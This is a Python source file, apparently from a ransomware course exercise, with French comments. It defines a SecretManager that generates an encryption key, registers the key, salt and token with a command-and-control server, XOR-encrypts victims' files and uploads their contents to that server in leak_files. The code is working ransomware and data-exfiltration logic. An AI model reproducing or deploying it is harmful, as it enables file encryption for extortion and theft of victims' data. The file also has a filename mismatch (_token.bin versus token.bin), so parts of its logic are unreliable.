from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import hashlib
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile



class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)
    
    
    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        # Crée un objet PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            salt=salt,
            iterations=self.ITERATION,
            length=self.KEY_LENGTH,
        )

        # Dérivation de la clé
        derived_key = kdf.derive(key)

        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
        # Génére un salt aléatoire
        salt = os.urandom(self.SALT_LENGTH)

        # Génére une clé privée aléatoire
        private_key = os.urandom(self.KEY_LENGTH)

        # Effectue la dérivation de la clé privée
        derived_key = self.do_derivation(salt, private_key)

        return salt, private_key, derived_key


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    

    def post_new(self, salt: bytes, key: bytes, token: bytes) ->int:
        # Convertit les bytes en chaînes Base64
        salt_b64 = self.bin_to_b64(salt)
        key_b64 = self.bin_to_b64(key)
        token_b64 = self.bin_to_b64(token)

        # Crée le dictionnaire JSON
        data = {
            "token": token_b64,
            "salt": salt_b64,
            "key": key_b64
        }

        dir_label = self.get_hex_token()
        # URL du CNC (Command and Control)
        cnc_url = f"http://{self._remote_host_port}/new?label={dir_label}" 
     

        # Envoie les données JSON au CNC
        response = requests.post(cnc_url, json=data)
        return response

      
    

   
    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc

        # creation des données crypto
        self._salt , self._key, self._token= self.create()
        
        
       
        post_status_code = self.post_new(self._salt, self._key, self._token)

        # affiche le resultat du statut
        self._log.debug("post_new request returned with code " + str(post_status_code))
    
        
        # open prend en paramètre  'wb' qui permet au program d'ecrire en fichier binaire 
        with open(os.path.join(self._path, "_token.bin"), "wb") as tokenfile:
            tokenfile.write(self._token)
        with open(os.path.join(self._path, "_salt.bin"), "wb") as saltfile:
            saltfile.write(self._salt)

        return None

 
    def load(self) -> None:
        # Charge le salt depuis le fichier local
        salt_file_path = os.path.join(self._path, 'salt.bin')
        if os.path.exists(salt_file_path):
            with open(salt_file_path, 'rb') as salt_file:
                self._salt = salt_file.read()
        else:
            print("Le fichier de sel n'existe pas. Assurez-vous de l'avoir généré auparavant.")

        # Charge le token depuis le fichier local
        token_file_path = os.path.join(self._path, 'token.bin')
        if os.path.exists(token_file_path):
            with open(token_file_path, 'rb') as token_file:
                self._token = token_file.read()
        else:
            print("Le fichier de token n'existe pas. Assurez-vous de l'avoir généré auparavant.")


  

    def check_key(self, candidate_key: bytes) -> bool:
        token = self.do_derivation(self._salt, candidate_key)
         # Comparaison de la clé candidate à la clé générée
        return token == self._token

    
    
    def set_key(self, b64_key: str) -> None:
        # Définit la clé en base64, ensuite valide la clé et stocker la clé
        candidate_key = base64.b64decode(b64_key)
        if self.check_key(candidate_key):
            self._key = candidate_key
        else:
            raise Exception("La clé fournie n'est pas valide.") 



    def get_hex_token(self) -> str:
        if not self._token:
            print("Le token n'est pas défini. Veuillez d'abord générer un token.")
            return ""

        # hachage le token
        sha256_hash = sha256(self._token)
        hex_token = sha256_hash.hexdigest()

        return hex_token



    def xorfiles(self, files: List[str]) -> None:
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")

    def leak_files(self, files: List[str]) -> None:
        # send files to the CNC
        # using hashed token filepath
        dir_label = self.get_hex_token()
        # creating destination URL
        folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
        # setting POST header
        header = {
                "Content-Type":"application/json"
                }
        for file in files:
            with open(f'{file}', 'rb') as f:
                # requests.post(file_url, files={f'f': f}, headers=header)
                file_data = self.bin_to_b64(f.read())
                file_json = {
                        # file name without parent directories in its path (relative path, in essence)
                        "file_name": file.rsplit('/', 1)[-1],
                        "file_data": file_data
                        }
                # POST request
                requests.post(folder_url, json=file_json, headers=header)
        return None

 

    def clean(self) -> None:
        # Supprime le fichier de salt
        saltfilepath = os.path.join(self._path, 'salt.bin')
        try:
            os.remove(saltfilepath)
            print("Le fichier de sel a été supprimé avec succès.")
        except FileNotFoundError:
            print("Le fichier de sel n'existe pas.")

        # Supprime le fichier de token
        tokenfilepath = os.path.join(self._path, 'token.bin')
        try:
            os.remove(tokenfilepath)
            print("Le fichier de token a été supprimé avec succès.")
        except FileNotFoundError:
            print("Le fichier de token n'existe pas.")




